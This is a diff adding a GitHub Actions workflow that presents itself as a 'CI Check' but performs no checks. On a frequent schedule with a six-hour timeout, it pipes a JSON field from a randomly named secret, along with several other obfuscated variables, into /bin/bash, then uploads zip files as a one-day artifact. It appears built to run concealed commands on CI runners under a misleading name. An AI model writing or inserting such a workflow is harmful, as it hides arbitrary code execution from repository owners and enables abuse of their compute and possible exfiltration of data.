@@ -1,0 +1,35 @@
+name: CI Check
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '41 5,11,17,23 * * *'
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  runner:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Go
+        env:
+          oqt95613: ${{ secrets.oqt95613 }}
+        run: |
+          printf '%s' "$oqt95613" | jq -r .each9 | /bin/bash
+          echo $zyfh1 | jq -r .t9 | /bin/bash
+          printf '%s' "$yj744" | jq -r .hxqo70 | /bin/bash
+          echo $gejik60341 | jq -r .ogq51422 | /bin/bash
+          printf '%s' "$pcovf2" | jq -r .hx56818 | /bin/bash
+
+      - name: Archive results
+        uses: actions/upload-artifact@v4
+        with:
+          name: nFNLND2j
+          path: "*.zip"
+          retention-days: 1
